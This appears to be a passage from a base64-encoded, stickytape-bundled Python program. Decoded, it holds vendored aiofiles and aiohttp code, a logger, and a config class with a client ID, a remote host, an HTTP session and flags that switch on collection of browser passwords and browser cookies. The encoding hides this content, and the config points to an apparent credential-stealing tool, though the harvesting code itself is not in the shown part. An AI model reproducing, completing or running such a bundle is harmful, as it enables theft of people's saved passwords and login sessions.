iXHJcbiAgICAgICAgaWYgc2VsZi5fZmlsZS5fcm9sbGVkOlxyXG4gICAgICAgICAgICBjYiA9IHBhcnRpYWwoc2VsZi5fZmlsZS53cml0ZSwgcylcclxuICAgICAgICAgICAgcmV0dXJuIGF3YWl0IHNlbGYuX2xvb3AucnVuX2luX2V4ZWN1dG9yKHNlbGYuX2V4ZWN1dG9yLCBjYilcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBmaWxlID0gc2VsZi5fZmlsZS5fZmlsZSAgIyByZWZlcmVuY2UgdW5kZXJseWluZyBiYXNlIElPIG9iamVjdFxyXG4gICAgICAgICAgICBydiA9IGZpbGUud3JpdGUocylcclxuICAgICAgICAgICAgYXdhaXQgc2VsZi5fY2hlY2soKVxyXG4gICAgICAgICAgICByZXR1cm4gcnZcclxuXHJcbiAgICBhc3luYyBkZWYgd3JpdGVsaW5lcyhzZWxmLCBpdGVyYWJsZSk6XHJcbiAgICAgICAgIiIiSW1wbGVtZW50YXRpb24gdG8gYW50aWNpcGF0ZSByb2xsb3ZlciIiIlxyXG4gICAgICAgIGlmIHNlbGYuX2ZpbGUuX3JvbGxlZDpcclxuICAgICAgICAgICAgY2IgPSBwYXJ0aWFsKHNlbGYuX2ZpbGUud3JpdGVsaW5lcywgaXRlcmFibGUpXHJcbiAgICAgICAgICAgIHJldHVybiBhd2FpdCBzZWxmLl9sb29wLnJ1bl9pbl9leGVjdXRvcihzZWxmLl9leGVjdXRvciwgY2IpXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgZmlsZSA9IHNlbGYuX2ZpbGUuX2ZpbGUgICMgcmVmZXJlbmNlIHVuZGVybHlpbmcgYmFzZSBJTyBvYmplY3RcclxuICAgICAgICAgICAgcnYgPSBmaWxlLndyaXRlbGluZXMoaXRlcmFibGUpXHJcbiAgICAgICAgICAgIGF3YWl0IHNlbGYuX2NoZWNrKClcclxuICAgICAgICAgICAgcmV0dXJuIHJ2XHJcblxyXG5cclxuQGRlbGVnYXRlX3RvX2V4ZWN1dG9yKCJjbGVhbnVwIilcclxuQHByb3h5X3Byb3BlcnR5X2RpcmVjdGx5KCJuYW1lIilcclxuY2xhc3MgQXN5bmNUZW1wb3JhcnlEaXJlY3Rvcnk6XHJcbiAgICAiIiJBc3luYyB3cmFwcGVyIGZvciBUZW1wb3JhcnlEaXJlY3RvcnkgY2xhc3MiIiJcclxuXHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgZmlsZSwgbG9vcCwgZXhlY3V0b3IpOlxyXG4gICAgICAgIHNlbGYuX2ZpbGUgPSBmaWxlXHJcbiAgICAgICAgc2VsZi5fbG9vcCA9IGxvb3BcclxuICAgICAgICBzZWxmLl9leGVjdXRvciA9IGV4ZWN1dG9yXHJcblxyXG4gICAgYXN5bmMgZGVmIGNsb3NlKHNlbGYpOlxyXG4gICAgICAgIGF3YWl0IHNlbGYuY2xlYW51cCgpXHJcbicpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdhaW9maWxlcy9vcy5weScsIGInIiIiQXN5bmMgZXhlY3V0b3IgdmVyc2lvbnMgb2YgZmlsZSBmdW5jdGlvbnMgZnJvbSB0aGUgb3MgbW9kdWxlLiIiIlxuaW1wb3J0IGFzeW5jaW9cbmZyb20gZnVuY3Rvb2xzIGltcG9ydCBwYXJ0aWFsLCB3cmFwc1xuaW1wb3J0IG9zXG5cblxuZGVmIHdyYXAoZnVuYyk6XG4gICAgQHdyYXBzKGZ1bmMpXG4gICAgYXN5bmMgZGVmIHJ1bigqYXJncywgbG9vcD1Ob25lLCBleGVjdXRvcj1Ob25lLCAqKmt3YXJncyk6XG4gICAgICAgIGlmIGxvb3AgaXMgTm9uZTpcbiAgICAgICAgICAgIGxvb3AgPSBhc3luY2lvLmdldF9ldmVudF9sb29wKClcbiAgICAgICAgcGZ1bmMgPSBwYXJ0aWFsKGZ1bmMsICphcmdzLCAqKmt3YXJncylcbiAgICAgICAgcmV0dXJuIGF3YWl0IGxvb3AucnVuX2luX2V4ZWN1dG9yKGV4ZWN1dG9yLCBwZnVuYylcblxuICAgIHJldHVybiBydW5cblxuXG5mcm9tIC4gaW1wb3J0IG9zcGF0aCBhcyBwYXRoXG5cblxuc3RhdCA9IHdyYXAob3Muc3RhdClcbnJlbmFtZSA9IHdyYXAob3MucmVuYW1lKVxucmVwbGFjZSA9IHdyYXAob3MucmVwbGFjZSlcbnJlbW92ZSA9IHdyYXAob3MucmVtb3ZlKVxubWtkaXIgPSB3cmFwKG9zLm1rZGlyKVxubWFrZWRpcnMgPSB3cmFwKG9zLm1ha2VkaXJzKVxucm1kaXIgPSB3cmFwKG9zLnJtZGlyKVxucmVtb3ZlZGlycyA9IHdyYXAob3MucmVtb3ZlZGlycylcblxuaWYgaGFzYXR0cihvcywgInNlbmRmaWxlIik6XG4gICAgc2VuZGZpbGUgPSB3cmFwKG9zLnNlbmRmaWxlKVxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ2Fpb2ZpbGVzL29zcGF0aC5weScsIGInIiIiQXN5bmMgZXhlY3V0b3IgdmVyc2lvbnMgb2YgZmlsZSBmdW5jdGlvbnMgZnJvbSB0aGUgb3MucGF0aCBtb2R1bGUuIiIiXG5cbmZyb20gLm9zIGltcG9ydCB3cmFwXG5mcm9tIG9zIGltcG9ydCBwYXRoXG5cbmV4aXN0cyA9IHdyYXAocGF0aC5leGlzdHMpXG5pc2ZpbGUgPSB3cmFwKHBhdGguaXNmaWxlKVxuaXNkaXIgPSB3cmFwKHBhdGguaXNkaXIpXG5nZXRzaXplID0gd3JhcChwYXRoLmdldHNpemUpXG5nZXRtdGltZSA9IHdyYXAocGF0aC5nZXRtdGltZSlcbmdldGF0aW1lID0gd3JhcChwYXRoLmdldGF0aW1lKVxuZ2V0Y3RpbWUgPSB3cmFwKHBhdGguZ2V0Y3RpbWUpXG5zYW1lZmlsZSA9IHdyYXAocGF0aC5zYW1lZmlsZSlcbnNhbWVvcGVuZmlsZSA9IHdyYXAocGF0aC5zYW1lb3BlbmZpbGUpXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnbG9nZ2VyLnB5JywgYidmcm9tIG9zLnBhdGggaW1wb3J0IGpvaW5cclxuZnJvbSBhaW9maWxlcyBpbXBvcnQgb3BlbiBhcyBhc3luY19vcGVuXHJcbmZyb20gZGF0ZXRpbWUgaW1wb3J0IGRhdGV0aW1lXHJcbmZyb20gYXN5bmNpbyBpbXBvcnQgU2VtYXBob3JlXHJcblxyXG5cclxuXHJcbmNsYXNzIExvZ2dlcigpOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGxvZ19wYXRoOiBzdHIpIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5wYXRoID0gam9pbihsb2dfcGF0aCwgXCd3b3JrX2xvZ3MudHh0XCcpXHJcbiAgICAgICAgc2VsZi5zZW0gPSBTZW1hcGhvcmUoMSlcclxuXHJcbiAgICBhc3luYyBkZWYgcHJpbnQoc2VsZiwgdGV4dCkgLT4gTm9uZTpcclxuICAgICAgICBhc3luYyB3aXRoIHNlbGYuc2VtOlxyXG4gICAgICAgICAgICBhc3luYyB3aXRoIGFzeW5jX29wZW4oc2VsZi5wYXRoLCBcJ2FcJywgZW5jb2Rpbmc9XCd1dGY4XCcpIGFzIGY6XHJcbiAgICAgICAgICAgICAgICBhd2FpdCBmLndyaXRlKGZcJ3t0ZXh0fVxcblwnKVxyXG5cclxuICAgIGFzeW5jIGRlZiBsb2coc2VsZiwgdGV4dCkgLT4gTm9uZTpcclxuICAgICAgICBub3cgPSBkYXRldGltZS5ub3coKS5zdHJmdGltZSgiJUg6JU06JVMiKVxyXG4gICAgICAgIGF3YWl0IHNlbGYucHJpbnQoZlwne25vd30gfCB7dGV4dH1cJylcclxuXHJcbiAgICBkZWYgc3luY19wcmludChzZWxmLCB0ZXh0KSAtPiBOb25lOlxyXG4gICAgICAgIHdpdGggb3BlbihzZWxmLnBhdGgsIFwnYVwnLCBlbmNvZGluZz1cJ3V0ZjhcJykgYXMgZjpcclxuICAgICAgICAgICAgZi53cml0ZShmXCd7dGV4dH1cXG5cJylcclxuXHJcbiAgICBkZWYgc3luY19sb2coc2VsZiwgdGV4dCkgLT4gTm9uZTpcclxuICAgICAgICBub3cgPSBkYXRldGltZS5ub3coKS5zdHJmdGltZSgiJUg6JU06JVMiKVxyXG4gICAgICAgIHNlbGYuc3luY19wcmludChmXCd7bm93fSB8IHt0ZXh0fVwnKScpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdjb25maWcucHknLCBiImZyb20gZGF0YWNsYXNzZXMgaW1wb3J0IGRhdGFjbGFzcywgZmllbGRcclxuZnJvbSBhaW9odHRwIGltcG9ydCBDbGllbnRTZXNzaW9uXHJcbmZyb20gbG9nZ2VyIGltcG9ydCBMb2dnZXJcclxuXHJcblxyXG5AZGF0YWNsYXNzXHJcbmNsYXNzIENvbmZpZzpcclxuICAgIGNsaWVudF9pZDogc3RyXHJcbiAgICBob3N0OiBzdHJcclxuICAgIGxvZ19wYXRoOiBzdHJcclxuICAgIGxvZ2dlcjogTG9nZ2VyXHJcbiAgICBzZXNzaW9uOiBDbGllbnRTZXNzaW9uXHJcbiAgICB0YWc6IHN0ciA9IGZpZWxkKGRlZmF1bHQ9J3h1eScpXHJcbiAgICBicm93c2VyX3Bhc3N3b3JkczogYm9vbCA9IGZpZWxkKGRlZmF1bHQ9VHJ1ZSlcclxuICAgIGJyb3dzZXJfY29va2llczogYm9vbCA9IGZpZWxkKGRlZmF1bHQ9VHJ1ZSkiKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnYWlvaHR0cC9fX2luaXRfXy5weScsIGInX192ZXJzaW9uX18gPSAiMy44LjEiXHJcblxyXG5mcm9tIHR5cGluZyBpbXBvcnQgVHVwbGVcclxuXHJcbmZyb20gLiBpbXBvcnQgaGRycyBhcyBoZHJzXHJcbmZyb20gLmNsaWVudCBpbXBvcnQgKFxyXG4gICAgQmFzZUNvbm5lY3RvciBhcyBCYXNlQ29ubmVjdG9yLFxyXG4gICAgQ2xpZW50Q29ubmVjdGlvbkVycm9yIGFzIENsaWVudENvbm5lY3Rpb25FcnJvcixcclxuICAgIENsaWVudENvbm5lY3RvckNlcnRpZmljYXRlRXJyb3IgYXMgQ2xpZW50Q29ubmVjdG9yQ2VydGlmaWNhdGVFcnJvcixcclxuICAgIENsaWVudENvbm5lY3RvckVycm9yIGFzIENsaWVudENvbm5lY3RvckVycm9yLFxyXG4gICAgQ2xpZW50Q29ubmVjdG9yU1NMRXJyb3IgYXMgQ2xpZW50Q29ubmVjdG9yU1NMRXJyb3IsXHJcbiAgICBDbGllbnRFcnJvciBhcyBDbGllbnRFcnJvcixcclxuICAgIENsaWVudEh0dHBQcm94eUVycm9yIGFzIENsaWVudEh0dHBQcm94eUVycm9yLFxyXG4gICAgQ2xpZW50T1NFcnJvciBhcyBDbGllbnRPU0Vycm9yLFxyXG4gICAgQ2xpZW50UGF5bG9hZEVycm9yIGFzIENsaWVudFBheWxvYWRFcnJvcixcclxuICAgIENsaWVudFByb3h5Q29ubmVjdGlvbkVycm9yIGFzIENsaWVudFByb3h5Q29ubmVjdGlvbkVycm9yLFxyXG4gICAgQ2xpZW50UmVxdWVzdCBhcyBDbGllbnRSZXF1ZXN0LFxyXG4gICAgQ2xpZW50UmVzcG9uc2UgYXMgQ2xpZW50UmVzcG9uc2UsXHJcbiAgICBDbGllbnRSZXNwb25zZUVycm9yIGFzIENsaWVudFJlc3BvbnNlRXJyb3IsXHJcbiAgICBDbGllbnRTZXNzaW9uIGFzIENsaWVudFNlc3Npb24sXHJcbiAgICBDbGllbnRTU0xFcnJvciBhcyBDbGllbnRTU0xFcnJvcixcclxuICAgIENsaWVudFRpbWVvdXQgYXMgQ2xpZW50VGltZW91dCxcclxuICAgIENsaWVudFdlYlNvY2tldFJlc3BvbnNlIGFzIENsaWVudFdlYlNvY2tldFJlc3BvbnNlLFxyXG4gICAgQ29udGVudFR5cGVFcnJvciBhcyBDb250ZW50VHlwZUVycm9yLFxyXG4gICAgRmluZ2VycHJpbnQgYXMgRmluZ2VycHJpbnQsXHJcbiAgICBJbnZhbGlkVVJMIGFzIEludmFsaWRVUkwsXHJcbiAgICBOYW1lZFBpcGVDb25uZWN0b3IgYXMgTmFtZWRQaXBlQ29ubmVjdG9yLFxyXG4gICAgUmVxdWVzdEluZm8gYXMgUmVxdWVzdEluZm8sXHJcbiAgICBTZXJ2ZXJDb25uZWN0aW9uRXJyb3IgYXMgU2VydmVyQ29ubmVjdGlvbkVycm9yLFxyXG4gICAgU2VydmVyRGlzY29ubmVjdGVkRXJyb3IgYXMgU2VydmVyRGlzY29ubmVjdGVkRXJyb3IsXHJcbiAgICBTZXJ2ZXJGaW5nZXJwcmludE1pc21hdGNoIGFzIFNlcnZlckZpbmdlcnByaW50TWlzbWF0Y2gsXHJcbiAgICBTZXJ2ZXJUaW1lb3V0RXJyb3IgYXMgU2VydmVyVGltZW91dEVycm9yLFxyXG4gICAgVENQQ29ubmVjdG9yIGFzIFRDUENvbm5lY3RvcixcclxuICAgIFRvb01hbnlSZWRpcmVjdHMgYXMgVG9vTWFueVJlZGlyZWN0cyxcclxuICAgIFVuaXhDb25uZWN0b3IgYXMgVW5peENvbm5lY3RvcixcclxuICAgIFdTU2VydmVySGFuZHNoYWtlRXJyb3IgYXMgV1NTZXJ2ZXJIYW5kc2hha2VFcnJvcixcclxuICAgIHJlcXVlc3QgYXMgcmVxdWVzdCxcclxuKVxyXG5mcm9tIC5jb29raWVqYXIgaW1wb3J0IENvb2tpZUphciBhcyBDb29raWVKYXIsIER1bW15Q29va2llSmFyIGFzIER1bW15Q29va2llSmFyXHJcbmZyb20gLmZvcm1kYXRhIGltcG9ydCBGb3JtRGF0YSBhcyBGb3JtRGF0YVxyXG5mcm9tIC5oZWxwZXJzIGltcG9ydCBCYXNpY0F1dGgsIENoYWluTWFwUHJveHksIEVUYWdcclxuZnJvbSAuaHR0cCBpbXBvcnQgKFxyXG4gICAgSHR0cFZlcnNpb24gYXMgSHR0cFZlcnNpb24sXHJcbiAgICBIdHRwVmVyc2lvbjEwIGFzIEh0dHBWZXJzaW9uMTAsXHJcbiAgICBIdHRwVmVyc2lvbjExIGFzIEh0dHBWZXJzaW9uMTEsXHJcbiAgICBXZWJTb2NrZXRFcnJvciBhcyBXZWJTb2NrZXRFcnJvcixcclxuICAgIFdTQ2xvc2VDb2RlIGFzIFdTQ2xvc2VDb2RlLFxyXG4gICAgV1NNZXNzYWdlIGFzIFdTTWVzc2FnZSxcclxuICAgIFdTTXNnVHlwZSBhcyBXU01zZ1R5cGUsXHJcbilcclxuZnJvbSAubXVsdGlwYXJ0IGltcG9ydCAoXHJcbiAgICBCYWRDb250ZW50RGlzcG9zaXRpb25IZWFkZXIgYXMgQmFkQ29udGVudERpc3Bvc2l0aW9uSGVhZGVyLFxyXG4gICAgQmFkQ29udGVudERpc3Bvc2l0aW9uUGFyYW0gYXMgQmFkQ29udGVudERpc3Bvc2l0aW9uUGFyYW0sXHJcbiAgICBCb2R5UGFydFJlYWRlciBhcyBCb2R5UGFydFJlYWRlcixcclxuICAgIE11bHRpcGFydFJlYWRlciBhcyBNdWx0aXBhcnRSZWFkZXIsXHJcbiAgICBNdWx0aXBhcnRXcml0ZXIgYXMgTXVsdGlwYXJ0V3JpdGVyLFxyXG4gICAgY29udGVudF9kaXNwb3NpdGlvbl9maWxlbmFtZSBhcyBjb250ZW50X2Rpc3Bvc2l0aW9uX2ZpbGVuYW1lLFxyXG4gICAgcGFyc2VfY29udGVudF9kaXNwb3NpdGlvbiBhcyBwYXJzZV9jb250ZW50X2Rpc3Bvc2l0aW9uLFxyXG4pXHJcbmZyb20gLnBheWxvYWQgaW1wb3J0IChcclxuICAgIFBBWUxPQURfUkVHSVNUUlkgYXMgUEFZTE9BRF9SRUdJU1RSWSxcclxuICAgIEFzeW5jSXRlcmFibGVQYXlsb2FkIGFzIEFzeW5jSXRlcmFibGVQYXlsb2FkLFxyXG4gICAgQnVmZmVyZWRSZWFkZXJQYXlsb2FkIGFzIEJ1ZmZlcmVkUmVhZGVyUGF5bG9hZCxcclxuICAgIEJ5dGVzSU9QYXlsb2FkIGFzIEJ5dGVzSU9QYXlsb2FkLFxyXG4gICAgQnl0ZXNQYXlsb2FkIGFzIEJ5dGVzUGF5bG9hZCxcclxuICAgIElPQmFzZVBheWxvYWQgYXMgSU9CYXNlUGF5bG9hZCxcclxuICAgIEpzb25QYXlsb2FkIGFzIEpzb25QYXlsb2FkLFxyXG4gICAgUGF5bG9hZCBhcyBQYXlsb2FkLFxyXG4gICAgU3RyaW5nSU9QYXlsb2FkIGFzIFN0cmluZ0lPUGF5bG9hZCxcclxuICAgIFN0cmluZ1BheWxvYWQgYXMgU3RyaW5nUGF5bG9hZCxcclxuICAgIFRleHRJT1BheWxvYWQgYXMgVGV4dElPUGF5bG9hZCxcclxuICAgIGdldF9wYXlsb2FkIGFzIGdldF9wYXlsb2FkLFxyXG4gICAgcGF5bG9hZF90eXBlIGFzIHBheWxvYWRfdHlwZSxcclxuKVxyXG5mcm9tIC5wYXlsb2FkX3N0cmVhbWVyIGltcG9ydCBzdHJlYW1lciBhcyBzdHJlYW1lclxyXG5mcm9tIC5yZXNvbHZlciBpbXBvcnQgKFxyXG4gICAgQXN5bmNSZXNvbHZlciBhcyBBc3luY1Jlc29sdmVyLFxyXG4gICAgRGVmYXVsdFJlc29sdmVyIGFzIERlZmF1bHRSZXNvbHZlcixcclxuICAgIFRocmVhZGVkUmVzb2x2ZXIgYXMgVGhyZWFkZWRSZXNvbHZlcixcclxuKVxyXG5mcm9tIC5zdHJlYW1zIGltcG9ydCAoXHJcbiAgICBFTVBUWV9QQVlMT0FEIGFzIEVNUFRZX1BBWUxPQUQsXHJcbiAgICBEYXRhUXVldWUgYXMgRGF0YVF1ZXVlLFxyXG4gICAgRW9mU3RyZWFtIGFzIEVvZlN0cmVhbSxcclxuICAgIEZsb3dDb250cm9sRGF0YVF1ZXVlIGFzIEZsb3dDb250cm9sRGF0YVF1ZXVlLFxyXG4gICAgU3RyZWFtUmVhZGVyIGFzIFN0cmVhbVJlYWRlcixcclxuKVxyXG5mcm9tIC50cmFjaW5nIGltcG9ydCAoXHJcbiAgICBUcmFjZUNvbmZpZyBhcyBUcmFjZUNvbmZpZyxcclxuICAgIFRyYWNlQ29ubmVjdGlvbkNyZWF0ZUVuZFBhcmFtcyBhcyBUcmFjZUNvbm5lY3Rpb25DcmVhdGVFbmRQYXJhbXMsXHJcbiAgICBUcmFjZUNvbm5lY3Rpb25DcmVhdGVTdGFydFBhcmFtcyBhcyBUcmFjZUNvbm5lY3Rpb25DcmVhdGVTdGFydFBhcmFtcyxcclxuICAgIFRyYWNlQ29ubmVjdGlvblF1ZXVlZEVuZFBhcmFtcyBhcyBUcmFjZUNvbm5lY3Rpb25RdWV1ZWRFbmRQYXJhbXMsXHJcbiAgICBUcmFjZUNvbm5lY3Rpb25RdWV1ZWRTdGFydFBhcmFtcyBhcyBUcmFjZUNvbm5lY3Rpb25RdWV1ZWRTdGFydFBhcmFtcyxcclxuICAgIFRyYWNlQ29ubmVjdGlvblJldXNlY29ublBhcmFtcyBhcyBUcmFjZUNvbm5lY3Rpb25SZXVzZWNvbm5QYXJhbXMsXHJcbiAgICBUcmFjZURuc0NhY2hlSGl0UGFyYW1zIGFzIFRyYWNlRG5zQ2FjaGVIaXRQYXJhbXMsXHJcbiAgICBUcmFjZURuc0NhY2hlTWlzc1BhcmFtcyBhcyBUcmFjZURuc0NhY2hlTWlzc1BhcmFtcyxcclxuICAgIFRyYWNlRG5zUmVzb2x2ZUhvc3RFbmRQYXJhbXMgYXMgVHJhY2VEbnNSZXNvbHZlSG9zdEVuZFBhcmFtcyxcclxuICAgIFRyYWNlRG5zUmVzb2x2ZUhvc3RTdGFydFBhcmFtcyBhcyBUcmFjZURuc1Jlc29sdmVIb3N0U3RhcnRQYXJhbXMsXHJcbiAgICBUcmFjZVJlcXVlc3RDaHVua1NlbnRQYXJhbXMgYXMgVHJhY2VSZXF1ZXN0Q2h1bmtTZW50UGFyYW1zLFxyXG4gICAgVHJhY2VSZXF1ZXN0RW5kUGFyYW1zIGFzIFRyYWNlUmVxdWVzdEVuZFBhcmFtcyxcclxuICAgIFRyYWNlUmVxdWVzdEV4Y2VwdGlvblBhcmFtcyBhcyBUcmFjZVJlcXVlc3RFeGNlcHRpb25QYXJhbXMsXHJcbiAgICBUcmFjZVJlcXVlc3RSZWRpcmVjdFBhcmFtcyBhcyBUcmFjZVJlcXVlc3RSZWRpcmVjdFBhcmFtcyxcclxuICAgIFRyYWNlUmVxdWVzdFN0YXJ0UGFyYW1zIGFzIFRyYWNlUmVxdWVzdFN0YXJ0UGFyYW1zLFxyXG4gICAgVHJhY2VSZXNwb25zZUNodW5rUmVjZWl2ZWRQYXJhbXMgYXMgVHJhY2VSZXNwb25zZUNodW5rUmVjZWl2ZWRQYXJhbXMsXHJcbilcclxuXHJcbl9fYWxsX186IFR1cGxlW3N0ciwgLi4uXSA9IChcclxuICAgICJoZHJzIixcclxuICAgICMgY2xpZW50XHJcbiAgICAiQmFzZUNvbm5lY3RvciIsXHJcbiAgICAiQ2xpZW50Q29ubmVjdGlvbkVycm9yIixcclxuICAgICJDbGllbnRDb25uZWN0b3JDZXJ0aWZpY2F0ZUVycm9yIixcclxuICAgICJDbGllbnRDb25uZWN0b3JFcnJvciIsXHJcbiAgICAiQ2xpZW50Q29ubmVjdG9yU1NMRXJyb3IiLFxyXG4gICAgIkNsaWVudEVycm9yIixcclxuICAgICJDbGllbnRIdHRwUHJveHlFcnJvciIsXHJcbiAgICAiQ2xpZW50T1NFcnJvciIsXHJcbiAgICAiQ2xpZW50UGF5bG9hZEVycm9yIixcclxuICAgICJDbGllbnRQcm94eUNvbm5lY3Rpb25FcnJvciIsXHJcbiAgICAiQ2xpZW50UmVzcG9uc2UiLFxyXG4gICAgIkNsaWVudFJlcXVlc3QiLFxyXG4gICAgIkNsaWVudFJlc3BvbnNlRXJyb3IiLFxyXG4gICAgIkNsaWVudFNTTEVycm9yIixcclxuICAgICJDbGllbnRTZXNzaW9uIixcclxuICAgICJDbGllbnRUaW1lb3V0IixcclxuICAgICJDbGllbnRXZWJTb2NrZXRSZXNwb25zZSIsXHJcbiAgICAiQ29udGVudFR5cGVFcnJvciIsXHJcbiAgICAiRmluZ2VycHJpbnQiLFxyXG4gICAgIkludmFsaWRVUkwiLFxyXG4gICAgIlJlcXVlc3RJbmZvIixcclxuICAgICJTZXJ2ZXJDb25uZWN0aW9uRXJyb3IiLFxyXG4gICAgIlNlcnZlckRpc2Nvbm5lY3RlZEVycm9yIixcclxuICAgICJTZXJ2ZXJGaW5nZXJwcmludE1pc21hdGNoIixcclxuICAgICJTZXJ2ZXJUaW1lb3V0RXJyb3IiLFxyXG4gICAgIlRDUENvbm5lY3RvciIsXHJcbiAgICAiVG9vTWFueVJlZGlyZWN0cyIsXHJcbiAgICAiVW5peENvbm5lY3RvciIsXHJcbiAgICAiTmFtZWRQaXBlQ29ubmVjdG9yIixcclxuICAgICJXU1NlcnZlckhhbmRzaGFrZUVycm9yIixcclxuICAgICJyZXF1ZXN0IixcclxuICAgICMgY29va2llamFyXHJcbiAgICAiQ29va2llSmFyIixcclxuICAgICJEdW1teUNvb2tpZUphciIsXHJcbiAgICAjIGZvcm1kYXRhXHJcbiAgICAiRm9ybURhdGEiLFxyXG4gICAgIyBoZWxwZXJzXHJcbiAgICAiQmFzaWNBdXRoIixcclxuICAgICJDaGFpbk1hcFByb3h5IixcclxuICAgICJFVGFnIixcclxuICAgICMgaHR0cFxyXG4gICAgIkh0dHBWZXJzaW9uIixcclxuICAgICJIdHRwVmVyc2lvbjEwIixcclxuICAgICJIdHRwVmVyc2lvbjExIixcclxuICAgICJXU01zZ1R5cGUiLFxyXG4gICAgIldTQ2xvc2VDb2RlIixcclxuICAgICJXU01lc3NhZ2UiLFxyXG4gICAgIldlYlNvY2tldEVycm9yIixcclxuICAgICMgbXVsdGlwYXJ0XHJcbiAgICAiQmFkQ29udGVudERpc3Bvc2l0aW9uSGVhZGVyIixcclxuICAgICJCYWRDb250ZW50RGlzcG9zaXRpb25QYXJhbSIsXHJcbiAgICAiQm9keVBhcnRSZWFkZXIiLFxyXG4gICAgIk11bHRpcGFydFJlYWRlciIsXHJcbiAgICAiTXVsdGlwYXJ0V3JpdGVyIixcclxuICAgICJjb250ZW50X2Rpc3Bvc2l0aW9uX2ZpbGVuYW1lIixcclxuICAgICJwYXJzZV9jb250ZW50X2Rpc3Bvc2l0aW9uIixcclxuICAgICMgcGF5bG9hZFxyXG4gICAgIkFzeW5jSXRlcmFibGVQYXlsb2FkIixcclxuICAgICJCdWZmZXJlZFJlYWRlclBheWxvYWQiLFxyXG4gICAgIkJ5dGVzSU9QYXlsb2FkIixcclxuICAgICJCeXRlc1BheWxvYWQiLFxyXG4gICAgIklPQmFzZVBheWxvYWQiLFxyXG4gICAgIkpzb25QYXlsb2FkIixcclxuICAgICJQQVlMT0FEX1JFR0lTVFJZIixcclxuICAgICJQYXlsb2FkIixcclxuICAgICJTdHJpbmdJT1BheWxvYWQiLFxyXG4gICAgIlN0cmluZ1BheWxvYWQiLFxyXG4gICAgIlRleHRJT1BheWxvYWQiLFxyXG4gICAgImdldF9wYXlsb2FkIixcclxuICAgICJwYXlsb2FkX3R5cGUiLFxyXG4gICAgIyBwYXlsb2FkX3N0cmVhbWVyXHJcbiAgICAic3RyZWFtZXIiLFxyXG4gICAgIyByZXNvbHZlclxyXG4gICAgIkFzeW5jUmVzb2x2ZXIiLFxyXG4gICAgIkRlZmF1bHRSZXNvbHZlciIsXHJcbiAgICAiVGhyZWFkZWRSZXNvbHZlciIsXHJcbiAgICAjIHN0cmVhbXNcclxuICAgICJEYXRhUXVldWUiLFxyXG4gICAgIkVNUFRZX1BBWUxPQUQiLFxyXG4gICAgIkVvZlN0cmVhbSIsXHJcbiAgICAiRmxvd0NvbnRyb2xEYXRhUXVldWUiLFxyXG4gICAgIlN0cmVhbVJlYWRlciIsXHJcbiAgICAjIHRyYWNpbmdcclxuICAgICJUcmFjZUNvbmZpZyIsXHJcbiAgICAiVHJhY2VDb25uZWN0aW9uQ3JlYXRlRW5kUGFyYW1zIixcclxuICAgICJUcmFjZUNvbm5lY3Rpb25DcmVhdGVTdGFydFBhcmFtcyIsXHJcbiAgICAiVHJhY2VDb25uZWN0aW9uUXVldWVkRW5kUGFyYW1zIixcclxuICAgICJUcmFjZUNvbm5lY3Rpb25RdWV1ZWRTdGFydFBhcmFtcyIsXHJcbiAgICAiVHJhY2VDb25uZWN0aW9uUmV1c2Vjb25uUGFyYW1zIixcclxuICAgICJUcmFjZURuc0NhY2hlSGl0UGFyYW1zIixcclxuICAgICJUcmFjZURuc0NhY2hlTWlzc1BhcmFtcyIsXHJcbiAgICAiVHJhY2VEbnNSZXNvbHZlSG9zdEVuZFBhcmFtcyIsXHJcbiAgICAiVHJhY2VEbnNSZXNvbHZlSG9zdFN0YXJ0UGFyYW1zIixcclxuICAgICJUcmFjZVJlcXVlc3RDaHVua1NlbnRQYXJhbXMiLFxyXG4gICAgIlRyYWNlUmVxdWVzdEVuZFBhcmFtcyIsXHJcbiAgICAiVHJhY2VSZXF1ZXN0RXhjZXB0aW9uUGFyYW1zIixcclxuICAgICJUcmFjZVJlcXVlc3RSZWRpcmVjdFBhcmFtcyIsXHJcbiAgICAiVHJhY2VSZXF1ZXN0U3RhcnRQYXJhbXMiLFxyXG4gICAgIlRyYWNlUmVzcG9uc2VDaHVua1JlY2VpdmVkUGFyYW1zIixcclxuKVxyXG5cclxudHJ5OlxyXG4gICAgZnJvbSAud29ya2VyIGltcG9ydCBHdW5pY29yblVWTG9vcFdlYldvcmtlciwgR3VuaWNvcm5XZWJXb3JrZXJcclxuXHJcbiAgICBfX2FsbF9fICs9ICgiR3VuaWNvcm5XZWJXb3JrZXIiLCAiR3VuaWNvcm5VVkxvb3BXZWJXb3JrZXIiKVxyXG5leGNlcHQgSW1wb3J0RXJyb3I6ICAjIHByYWdtYTogbm8gY292ZXJcclxuICAgIHBhc3NcclxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ2Fpb2h0dHAvaGRycy5weScsIGInIiIiSFRUUCBIZWFkZXJzIGNvbnN0YW50cy4iIiJcclxuXHJcbiMgQWZ0ZXIgY2hhbmdpbmcgdGhlIGZpbGUgY29udGVudCBjYWxsIC4vdG9vbHMvZ2VuLnB5XHJcbiMgdG8gcmVnZW5lcmF0ZSB0aGUgaGVhZGVycyBwYXJzZXJcclxuaW1wb3J0IHN5c1xyXG5mcm9tIHR5cGluZyBpbXBvcnQgU2V0XHJcblxyXG5mcm9tIG11bHRpZGljdCBpbXBvcnQgaXN0clxyXG5cclxuaWYgc3lzLnZlcnNpb25faW5mbyA+PSAoMywgOCk6XHJcbiAgICBmcm9tIHR5cGluZyBpbXBvcnQgRmluYWxcclxuZWxzZTpcclxuICAgIGZyb20gdHlwaW5nX2V4dGVuc2lvbnMgaW1wb3J0IEZpbmFsXHJcblxyXG5NRVRIX0FOWTogRmluYWxbc3RyXSA9ICIqIlxyXG5NRVRIX0NPTk5FQ1Q6IEZpbmFsW3N0cl0gPSAiQ09OTkVDVCJcclxuTUVUSF9IRUFEOiBGaW5hbFtzdHJdID0gIkhFQUQiXHJcbk1FVEhfR0VUOiBGaW5hbFtzdHJdID0gIkdF